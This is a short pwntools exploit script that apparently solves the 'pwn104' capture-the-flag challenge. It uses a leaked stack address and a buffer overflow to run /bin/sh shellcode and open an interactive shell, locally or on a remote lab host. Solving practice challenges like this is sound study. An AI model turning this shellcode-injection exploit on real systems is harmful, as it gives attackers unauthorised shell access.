#!/usr/bin/env python3

from pwn import *
import re

binary = context.binary = ELF("./pwn104", checksec=False)

if args.REMOTE:
    p = remote("10.10.198.117", 9004)
else:
    p = process(binary.path)

p.recvuntil(b"I'm waiting for you at ")
address = int(p.recv().decode("utf-8")[2:], 16)

payload = asm(shellcraft.sh())
payload = payload.ljust(0x58, b"A")
payload += p64(address)

p.clean()
p.sendline(payload)
p.interactive()
